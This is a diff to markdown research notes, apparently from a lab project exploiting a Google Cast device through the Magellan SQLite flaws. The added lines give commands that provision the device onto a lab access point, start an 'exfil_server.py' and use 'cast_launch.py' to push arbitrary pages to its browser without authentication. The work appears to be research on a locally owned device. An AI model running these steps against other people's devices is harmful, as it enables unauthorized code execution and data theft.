@@ -574,11 +574,16 @@ before any write operations — losing it permanently breaks Cast device authent
 **CVEs:** CVE-2018-20346, CVE-2018-20505, CVE-2018-20506  
 **Source:** Tencent Blade Team, DEF CON 27 / Black Hat USA 2019  
 
-**Updated assessment (2026-10-26):** Build 3.75.468362 is from approximately 2023–2024, based
-on the sequential build number gap (current production is 3.78.540761, a gap of ~72 000 builds).
-Chrome 71 (Magellan fix) shipped December 2018 — a 2023+ factory image definitively includes
-Chrome 71+. Additionally, courk's H0A kernel dump shows a June 2019 build date, by which point
-Google had already shipped the Magellan OTA (January 2019). **Do not spend time on Magellan.**
+**REVISED assessment (2026-10-26, after cert decode):** The device TLS certificate was issued
+**2018-09-05** (decoded from `sign.certificate` in `eureka_info`). Certificate issuance = factory
+programming date. This device was manufactured **90 days before Chrome 71** (2018-12-04) and has
+**never taken an OTA** (`has_update: false`, `new_version: "0.0.0.0"`). **Magellan IS applicable.**
+
+The earlier estimate of "2023-2024 build" was wrong — the 3.75.x build number sequence is
+device-class-specific, not an absolute global counter comparable to current production builds.
+The device cert is the authoritative source for manufacture date.
+
+Evidence: `evidence/20261026-133839-setup-api.json` → `sign.certificate` → `notBefore: 2018-09-05T05:06:08Z`
 
 **The Cast LAUNCH delivery mechanism still works** — `cast_launch.py` successfully pushes
 arbitrary URLs to `cast_shell`'s Chromium renderer with zero auth. That JS execution primitive
@@ -591,8 +596,23 @@ bash scripts/probe-on-hotspot.sh
 # probe.html reports navigator.userAgent → exact Chrome build number
 ```
 
-**If WebSQL is absent** (Chrome ≥ 97 disables it by default): the SQLite path is blocked
-but JS still runs. Use the Cast SDK APIs instead (see F18).
+**Cast port 8009 is only available after provisioning** — the setup hotspot only serves
+the setup API (8443/8008). Cast receiver is not active while unprovisioned.
+**Provision onto Pi AP first (scripts/provision-wifi.py), then run cast_launch.py.**
+
+**Step sequence:**
+```bash
+# 1. Provision (one-time)
+sudo bash scripts/lab-ap.sh start
+python3 scripts/provision-wifi.py --ssid gh-lab --pass ghlab12345
+# Note Mini's IP from DHCP log (10.42.0.x)
+
+# 2. Run the probe — confirms SQLite version
+python3 reconstruction/exploit/magellan/exfil_server.py --ip 10.42.0.1
+python3 reconstruction/exploit/magellan/cast_launch.py \
+    10.42.0.100 http://10.42.0.1:8080/probe.html
+# Expected: "SQLite 3.2x.x | FTS3: YES | Magellan: VULNERABLE"
+```
 
 **Files:**
 - `reconstruction/exploit/magellan/cast_launch.py` — sends Cast LAUNCH over port 8009
